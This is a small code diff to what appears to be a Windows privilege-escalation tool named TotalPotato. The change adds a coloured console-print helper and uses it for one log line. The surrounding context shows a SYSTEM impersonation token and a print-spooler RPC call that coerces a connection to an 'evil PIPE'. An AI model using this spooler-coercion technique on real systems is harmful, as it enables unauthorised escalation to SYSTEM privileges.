@@ -16,7 +16,12 @@ namespace TotalPotato
         IntPtr systemImpersonationToken = IntPtr.Zero;
 
         public IntPtr Token { get { return systemImpersonationToken; } }
-
+        public void VerbosePrint(string message, ConsoleColor color = ConsoleColor.White)
+        {
+            Console.ForegroundColor = color;
+            Console.WriteLine(message);
+            Console.ResetColor();
+        }
         void SpoolPipeThread()
         {
 
@@ -75,7 +80,7 @@ namespace TotalPotato
                 return;
             }
 
-            Console.WriteLine($"[+] Triggering notification on evil PIPE {captureServer}");
+            VerbosePrint($"[+] Triggering notification on evil PIPE {captureServer}");
             c.RpcRemoteFindFirstPrinterChangeNotificationEx(handle, PRINTER_CHANGE_ADD_JOB, 0, captureServer, 0, null);
             c.RpcClosePrinter(ref handle);
         }
